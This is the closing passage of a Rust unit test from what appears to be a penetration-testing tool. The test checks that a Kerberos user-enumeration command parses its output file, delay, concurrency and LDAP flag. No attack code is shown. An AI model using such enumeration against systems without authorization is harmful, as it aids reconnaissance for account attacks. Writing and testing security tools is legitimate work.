                assert_eq!(output.as_deref(), Some("valid-users.txt"));
                assert_eq!(delay, 10);
                assert_eq!(concurrency, 10);
                assert!(!use_ldap);
            }
            _ => panic!("expected parsed kerberos user-enum command"),
        }
    }
}
